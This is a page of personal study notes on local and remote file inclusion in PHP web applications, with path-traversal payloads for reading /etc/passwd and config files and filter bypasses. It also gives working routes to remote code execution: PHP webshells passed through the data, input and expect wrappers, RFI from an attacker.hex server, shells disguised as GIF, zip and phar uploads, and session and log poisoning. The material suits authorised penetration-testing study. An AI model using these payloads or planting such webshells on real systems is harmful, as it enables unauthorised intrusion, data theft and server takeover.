---
title: File inclusion
description: My notes on file inclusion (LFI/RFI)
---
# Overview
The goal of this vulnerability is to fetch files from the local file system, and if possible , execute them. Through this vulnerability we can read sensitive files on the system and if there is an upload function we can upload a file to another directory to avoid execution rules present on the `uploads` directory.

# File Disclosure
## Local File Inclusion
### Filename Prefix
If the application prepends a string to our input we can try to fetch local files by prepending our input with `/`. Example of this  is when we send `../../../etc/passwd` to the server and it adds `lang_` to the start of it, we end up with `lang_../../../etc/passwd` which is not a valid filename, instead we can input `/../../../etc/passwd` and once our payload reaches the backend it'll be `lang_/../../../etc/passwd`  which may work in this case.
### Second-Order Attacks
This is like a stored XSS or like storing a SLQi payload in the database to fetch it later and execute it. We need to find a parameter that we control indirectly, and is used in file fetching functionality. For example; `/profile/$username/avatar.png` is an endpoint that the back end uses to let the user download his avatar, the back end communicates with the database and fetches the username present in it. In this case we control the `$username`  field, and the functionality of this endpoint is to fetch a file on the local system, we can abuse this by changing the username to an LFI payload. So the username will be `../../../etc/passwd`, in that case when the back end sends a request to that endpoint and fetches the username from the database it will request `/profile/../../../etc/passwd/avatar.png`, we can append `#` after our payload to comment out the `/avatar.png` bit, and we will download the `passwd` file.
## Basic Bypasses
### Non-Recursive Path Traversal Filters
In this filter, the developer doesn't recursively check the user input so it runs only one time. For example 
```php
$language = str_replace('../', '', $_GET['language']);
```
this code would check the input for any path traversal sequences, and removes them. The problem is that this only runs once, so we can input `....//` the application will see `../` and remove it but we will end up with `../` which means we still have the path traversal sequence. We can also try `..././` and `....\/`
### Encoding
Some filters may prevent input filters that have a certain character like a dot or a slash. We can URL encode our payload so that when it's decoded it will still have the black-listed characters.
>For this to work we must encode all characters including the dots

### Approved Paths
Some web servers will use regex to ensure that the requested parameter starts with a specific directory;
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
This can be bypassed by simply prepending the required path to our payload. we can also use the other bypasses like encoding
### Appended Extension
If the web application appends an extension to our input we face to scenarios. The first one is the php version is less than 5.3/5.4 , in this case we can bypass this. The other one is we have a modern webapp, in that case we should look for source files that match the same extension(e.g. if we have a .php extension we can look for config.php)
#### Path Truncation
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`). We can combine all of the above limitations and create a long string that ends on 4096 characters so that the extension comes after that and gets truncated. It is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work. We can generate the payload with bash;
```shell
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
#### Null Bytes
PHP before 5.5 is vulnerable to null byte injection. We can add a null byte after our payload to "comment out" every thing that comes after, so that `/etc/passwd%00.php` becomes `/etc/passwd`
## PHP Filters
The syntax to use PHP filters is `php://filter/read=<FILTER>/resource=<FILE>`. There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.
## Input Filters
After we FUZZ for files on the servers, we can try to use the LFI vulnerability found and access them. But you'll notice that the PHP files get executed, this is why we should use the Input Filters, instead of specifying the file with an LFI `../config.php`, we use the PHP filters `php://filter/read=convert.base64-encode/resource=config.php` this way the output will be the file data but base64 encoded, we can then use cyberchef to decode the contents.
# Remote Code Execution
## Data
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.
#### Checking PHP Configurations
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Once we have the config file contents we can grep `allow_url_include` ;
```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
#### Remote Code Execution
We can use the `data` wrapper to execute system commands. We can pass our Base64/URL encoded payload to the wrapper and it will decode it and execute the php code inside. The syntax for using the wrapper is `data://text/plain;base64,<BASE64/URL ENCODED PAYLOAD>`, if our payload was `<?php system($_GET['cmd']); ?>` the full URL would be `vulnparam=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=id`
## Input
Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting. We can abuse the `input` wrapper by sending a POST request to the vulnerable endpoint with the data being our php payload;
```shell
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
>In the above payload we see that we requested a GET parameter, so the endpoint should also support the GET method. If however the endpoint only allows POST requests we can use the `system` function directly like ; `<\?php system('id'); ?>` 

## Expect
This wrapper is designed for code execution so we don't need a webshell, it is an extension though, so not all systems have it installed, we can just pass the commands directly. Before that we need to check the `php.ini` file for the extension `expect`;
```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
The syntax for this wrapper is straight forward, `expect://<CMD>` ; 
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Remote File Inclusion (RFI)
RFI means that the server requests a remote resource instead of a local one, similar to SSRF. We can abuse this vulnerability to execute code on the system by requesting a resource from our server that can be executed on the target. If we have a PHP server we can create a simple PHP webshell `<?php system($_GET['x']); ?>` and put it in a file name `shell.php` we can then open an HTTP,FTP,SMB server and request the resource.
### Verify RFI
In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:
```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
### Checking for RFI
The best way to check for RFI is to `include a remote url`, we can start by including a local url `http://127.0.0.1:80/index.php` to make sure the vulnerability is present.
### No Code Execution
Checking the above image you can see that not all functions allow code execution. In this case we can enumerate the server files and ports using SSRF techniques.
### HTTP method
ATTACKER
```shell
python -m http.server 80
```
TARGET
```http
http://target.com/index.php?param=http://attacker.hex/shell.php&x=id
```
### FTP method
ATTACKER
```shell
sudo python -m pyftpdlib -p 21
```
TARGET
```http
http://target.com/index.php?param=ftp://attacker.hex/shell.php&x=id
```
### SMB method
If the target is a windows machine you can try this method with a higher chance of success;
ATTACKER
```
smbserver.py -smb2support <SHARE_NAME> $(pwd)
```
TARGET
```http
http://target.com/index.php?param=\\attacker.hex\<SHARE_NAME>\shell.php&x=id
```
## LFI and File Uploads

## Image upload
#### Crafting Malicious Image
We can craft a malicious image and embed our code within it. the most basic image type is `gif` as we need to specify the magic number before our payload, the `gif` magic number `GIF8` is easily typed as its just an ASCII string unlike other types. We start by injecting our payload into a file ;
```shell
echo -e 'GIF8\n<?php system($_GET["x"]); ?>' > shell.gif
```
we can then upload the file and access it with the `x` parameter to execute commands on the server.
#### Zip Upload
This is a PHP-only technique as it utilizes the `zip://` wrapper. We start by creating our php payload and zip it into an archive named `shell.jpg`, after that we can upload it to the server and use the `zip://` wrapper;
```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```shell
curl 'http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg#shell.php&cmd=id' 
```
We use the `#` character to specify the file inside the archive, in this case `shell.php`.
>We named the archive `shell.jpg` in case the webserver checks the extension of the uploaded file. This can be easily detected if the server checks the content type and contents of the file uploaded.

#### Phar Upload
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
?>
```
This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
```shell
curl 'http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg/shell.txt&cmd=id'
```
## Log Poisoning
Logs are the files that store information about the server requests or our session. We can achieve RCE with two conditions;

- The vulnerable function allow code execution
- We control the value of a parameter that is written into the log file
- The web account `www-data` have read privileges over the log files

If these to conditions are met, there is a very high chance that we may get RCE on the server.
### PHP Session Poisoning
Most PHP web applications utilize `PHPSESSID` cookies. These cookies are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
Let's say for example that our cookie is `gghhtt` and we have LFI on the server with a function that executes code and runs on debian, we can access our cookie file at `/var/lib/php/sessions/sess_gghhtt`;
```shell
curl http://target.com/index.php?language=../../var/lib/php/sessions/sess_gghhtt
selected_language|s:62:"../../../var/lib/php/sessions/4v9cpesb6qqv92cnmvm577644n";preference|s:7:"Spanish";
```
In this case we see that we control a parameter in the log file `selected_language` which we can inject php code into and when we call it again we should get the result of the executed code.

>When you examine the log file, you will see the values of the last request before the LFI request, that is because the session file updates with every request.

We can then inject php code into the parameter we control like, note that the payload is URL encoded;
```shell
curl http://target.com/index.php?language=%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
```
After that we can access the file again;
```shell
curl http://target.com/index.php?language=../../../var/lib/php/sessions/sess_4v9cpesb6qqv92cnmvm577644n | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Server Log Poisoning
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

>The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.


# Neat Tricks
- Instead of searching for the home directory for the application, you can use `/proc/self/cwd/` and provide the filename you want `/proc/self/cwd/index.php`
# Good Wordlists
[Wordlist for configuration files (Linux)](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
[Wordlist for configuration files (Windows)](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
# Resources
[Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
[HTB Path traversal inclusion](https://academy.hackthebox.com/module/details/23)